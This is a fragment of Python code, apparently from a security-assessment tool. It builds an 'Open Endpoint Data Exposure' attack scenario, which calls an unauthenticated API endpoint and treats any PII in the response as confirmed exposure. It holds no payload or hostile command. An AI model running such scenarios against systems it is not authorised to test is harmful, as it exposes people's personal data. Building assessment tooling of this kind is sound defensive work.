                sensitive_fields=sensitive_fields or [],
            )
        ],
    )
    chain.pre_score = pre_score(chain, has_unauth_entry=True, pii_in_path=True)
    return AttackScenario(
        scenario_id=str(uuid.uuid4()),
        goal_type=GoalType.API_ATTACK,
        scenario_type=ScenarioType.DIRECT_PII_EXTRACTION,
        title=f"Open Endpoint Data Exposure — {endpoint_name}",
        description=(
            f"Call {method} {path}, an endpoint that requires no authentication "
            f"by design and is declared to return sensitive data.  A response "
            f"containing PII/PHI/PFI values or field names confirms "
            f"unrestricted data exposure."
        ),
        target_node_ids=[endpoint_id],
        impact_score=chain.pre_score,
        chain=chain,
    )
